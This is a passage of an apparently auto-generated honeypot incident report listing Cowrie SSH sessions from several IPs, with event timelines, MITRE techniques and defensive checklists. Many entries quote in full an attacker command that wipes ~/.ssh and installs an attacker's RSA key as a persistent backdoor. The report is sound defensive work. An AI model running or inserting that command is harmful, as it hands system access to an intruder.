| `2026-04-14 08:32:12` | `cowrie.command.failed` |
| `2026-04-14 08:32:12` | `cowrie.log.closed` |
| `2026-04-14 08:32:12` | `cowrie.session.params` |
| `2026-04-14 08:32:12` | `cowrie.command.input` |
| `2026-04-14 08:32:13` | `cowrie.session.file_download` |
| `2026-04-14 08:32:13` | `cowrie.log.closed` |
| `2026-04-14 08:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ad77df23f1

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:32 |
| **Last Seen** | 2026-04-14 08:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:32:15` | `cowrie.session.connect` |
| `2026-04-14 08:32:15` | `cowrie.client.version` |
| `2026-04-14 08:32:16` | `cowrie.client.kex` |
| `2026-04-14 08:32:16` | `cowrie.login.success` |
| `2026-04-14 08:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27a0f01f38b6

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:32 |
| **Last Seen** | 2026-04-14 08:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:32:39` | `cowrie.session.connect` |
| `2026-04-14 08:32:40` | `cowrie.client.version` |
| `2026-04-14 08:32:40` | `cowrie.client.kex` |
| `2026-04-14 08:32:41` | `cowrie.login.success` |
| `2026-04-14 08:32:42` | `cowrie.session.params` |
| `2026-04-14 08:32:42` | `cowrie.command.input` |
| `2026-04-14 08:32:42` | `cowrie.command.failed` |
| `2026-04-14 08:32:43` | `cowrie.log.closed` |
| `2026-04-14 08:32:43` | `cowrie.session.params` |
| `2026-04-14 08:32:43` | `cowrie.command.input` |
| `2026-04-14 08:32:45` | `cowrie.session.file_download` |
| `2026-04-14 08:32:45` | `cowrie.log.closed` |
| `2026-04-14 08:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2127e0e7d517

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:32 |
| **Last Seen** | 2026-04-14 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:32:49` | `cowrie.session.connect` |
| `2026-04-14 08:32:49` | `cowrie.client.version` |
| `2026-04-14 08:32:49` | `cowrie.client.kex` |
| `2026-04-14 08:32:49` | `cowrie.login.success` |
| `2026-04-14 08:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b76f4c63e7c

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:33 |
| **Last Seen** | 2026-04-14 08:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:33:01` | `cowrie.session.connect` |
| `2026-04-14 08:33:01` | `cowrie.client.version` |
| `2026-04-14 08:33:01` | `cowrie.client.kex` |
| `2026-04-14 08:33:01` | `cowrie.login.success` |
| `2026-04-14 08:33:02` | `cowrie.session.params` |
| `2026-04-14 08:33:02` | `cowrie.command.input` |
| `2026-04-14 08:33:02` | `cowrie.command.failed` |
| `2026-04-14 08:33:02` | `cowrie.log.closed` |
| `2026-04-14 08:33:02` | `cowrie.session.params` |
| `2026-04-14 08:33:02` | `cowrie.command.input` |
| `2026-04-14 08:33:02` | `cowrie.session.file_download` |
| `2026-04-14 08:33:02` | `cowrie.log.closed` |
| `2026-04-14 08:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e63bd15e32d

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:33 |
| **Last Seen** | 2026-04-14 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:33:04` | `cowrie.session.connect` |
| `2026-04-14 08:33:04` | `cowrie.client.version` |
| `2026-04-14 08:33:04` | `cowrie.client.kex` |
| `2026-04-14 08:33:05` | `cowrie.login.success` |
| `2026-04-14 08:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4539f63630

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:33 |
| **Last Seen** | 2026-04-14 08:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:33:42` | `cowrie.session.connect` |
| `2026-04-14 08:33:42` | `cowrie.client.version` |
| `2026-04-14 08:33:42` | `cowrie.client.kex` |
| `2026-04-14 08:33:43` | `cowrie.login.success` |
| `2026-04-14 08:33:45` | `cowrie.session.params` |
| `2026-04-14 08:33:45` | `cowrie.command.input` |
| `2026-04-14 08:33:45` | `cowrie.command.failed` |
| `2026-04-14 08:33:46` | `cowrie.log.closed` |
| `2026-04-14 08:33:47` | `cowrie.session.params` |
| `2026-04-14 08:33:47` | `cowrie.command.input` |
| `2026-04-14 08:33:47` | `cowrie.session.file_download` |
| `2026-04-14 08:33:47` | `cowrie.log.closed` |
| `2026-04-14 08:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c5a414d55c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:33 |
| **Last Seen** | 2026-04-14 08:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:33:50` | `cowrie.session.connect` |
| `2026-04-14 08:33:50` | `cowrie.client.version` |
| `2026-04-14 08:33:50` | `cowrie.client.kex` |
| `2026-04-14 08:33:52` | `cowrie.login.success` |
| `2026-04-14 08:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39722b02179

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:34 |
| **Last Seen** | 2026-04-14 08:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:34:18` | `cowrie.session.connect` |
| `2026-04-14 08:34:18` | `cowrie.client.version` |
| `2026-04-14 08:34:19` | `cowrie.client.kex` |
| `2026-04-14 08:34:20` | `cowrie.login.success` |
| `2026-04-14 08:34:22` | `cowrie.session.params` |
| `2026-04-14 08:34:22` | `cowrie.command.input` |
| `2026-04-14 08:34:22` | `cowrie.command.failed` |
| `2026-04-14 08:34:22` | `cowrie.log.closed` |
| `2026-04-14 08:34:24` | `cowrie.session.params` |
| `2026-04-14 08:34:24` | `cowrie.command.input` |
| `2026-04-14 08:34:24` | `cowrie.session.file_download` |
| `2026-04-14 08:34:24` | `cowrie.log.closed` |
| `2026-04-14 08:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99390c6cc482

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:34 |
| **Last Seen** | 2026-04-14 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:34:26` | `cowrie.session.connect` |
| `2026-04-14 08:34:26` | `cowrie.client.version` |
| `2026-04-14 08:34:27` | `cowrie.client.kex` |
| `2026-04-14 08:34:27` | `cowrie.login.success` |
| `2026-04-14 08:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29afe44b87b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:34 |
| **Last Seen** | 2026-04-14 08:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:34:50` | `cowrie.session.connect` |
| `2026-04-14 08:34:51` | `cowrie.client.version` |
| `2026-04-14 08:34:51` | `cowrie.client.kex` |
| `2026-04-14 08:34:53` | `cowrie.login.success` |
| `2026-04-14 08:34:53` | `cowrie.session.params` |
| `2026-04-14 08:34:53` | `cowrie.command.input` |
| `2026-04-14 08:34:53` | `cowrie.command.failed` |
| `2026-04-14 08:34:53` | `cowrie.log.closed` |
| `2026-04-14 08:34:55` | `cowrie.session.params` |
| `2026-04-14 08:34:55` | `cowrie.command.input` |
| `2026-04-14 08:34:55` | `cowrie.session.file_download` |
| `2026-04-14 08:34:55` | `cowrie.log.closed` |
| `2026-04-14 08:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6cd6cf208a4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:35 |
| **Last Seen** | 2026-04-14 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:35:01` | `cowrie.session.connect` |
| `2026-04-14 08:35:01` | `cowrie.client.version` |
| `2026-04-14 08:35:01` | `cowrie.client.kex` |
| `2026-04-14 08:35:01` | `cowrie.login.success` |
| `2026-04-14 08:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc018bd1ccc1

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:36 |
| **Last Seen** | 2026-04-14 08:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:36:12` | `cowrie.session.connect` |
| `2026-04-14 08:36:12` | `cowrie.client.version` |
| `2026-04-14 08:36:13` | `cowrie.client.kex` |
| `2026-04-14 08:36:13` | `cowrie.login.success` |
| `2026-04-14 08:36:13` | `cowrie.session.params` |
| `2026-04-14 08:36:13` | `cowrie.command.input` |
| `2026-04-14 08:36:13` | `cowrie.command.failed` |
| `2026-04-14 08:36:13` | `cowrie.log.closed` |
| `2026-04-14 08:36:14` | `cowrie.session.params` |
| `2026-04-14 08:36:14` | `cowrie.command.input` |
| `2026-04-14 08:36:14` | `cowrie.session.file_download` |
| `2026-04-14 08:36:14` | `cowrie.log.closed` |
| `2026-04-14 08:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fffe39ff1d

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:36 |
| **Last Seen** | 2026-04-14 08:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:36:14` | `cowrie.session.connect` |
| `2026-04-14 08:36:14` | `cowrie.client.version` |
| `2026-04-14 08:36:14` | `cowrie.client.kex` |
| `2026-04-14 08:36:15` | `cowrie.login.success` |
| `2026-04-14 08:36:15` | `cowrie.session.params` |
| `2026-04-14 08:36:15` | `cowrie.command.input` |
| `2026-04-14 08:36:15` | `cowrie.command.failed` |
| `2026-04-14 08:36:15` | `cowrie.log.closed` |
| `2026-04-14 08:36:16` | `cowrie.session.params` |
| `2026-04-14 08:36:16` | `cowrie.command.input` |
| `2026-04-14 08:36:16` | `cowrie.session.file_download` |
| `2026-04-14 08:36:16` | `cowrie.log.closed` |
| `2026-04-14 08:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f625503f00

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:36 |
| **Last Seen** | 2026-04-14 08:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:36:16` | `cowrie.session.connect` |
| `2026-04-14 08:36:16` | `cowrie.client.version` |
| `2026-04-14 08:36:16` | `cowrie.client.kex` |
| `2026-04-14 08:36:17` | `cowrie.login.success` |
| `2026-04-14 08:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9754cabf6862

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:36 |
| **Last Seen** | 2026-04-14 08:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:36:18` | `cowrie.session.connect` |
| `2026-04-14 08:36:18` | `cowrie.client.version` |
| `2026-04-14 08:36:18` | `cowrie.client.kex` |
| `2026-04-14 08:36:19` | `cowrie.login.success` |
| `2026-04-14 08:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ccf529ace7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:36 |
| **Last Seen** | 2026-04-14 08:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:36:52` | `cowrie.session.connect` |
| `2026-04-14 08:36:52` | `cowrie.client.version` |
| `2026-04-14 08:36:53` | `cowrie.client.kex` |
| `2026-04-14 08:36:54` | `cowrie.login.success` |
| `2026-04-14 08:36:54` | `cowrie.session.params` |
| `2026-04-14 08:36:54` | `cowrie.command.input` |
| `2026-04-14 08:36:54` | `cowrie.command.failed` |
| `2026-04-14 08:36:54` | `cowrie.log.closed` |
| `2026-04-14 08:36:56` | `cowrie.session.params` |
| `2026-04-14 08:36:56` | `cowrie.command.input` |
| `2026-04-14 08:36:58` | `cowrie.session.file_download` |
| `2026-04-14 08:36:58` | `cowrie.log.closed` |
| `2026-04-14 08:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6b77161412

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:37 |
| **Last Seen** | 2026-04-14 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:37:01` | `cowrie.session.connect` |
| `2026-04-14 08:37:01` | `cowrie.client.version` |
| `2026-04-14 08:37:01` | `cowrie.client.kex` |
| `2026-04-14 08:37:02` | `cowrie.login.success` |
| `2026-04-14 08:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56fdc730e55a

| Field | Detail |
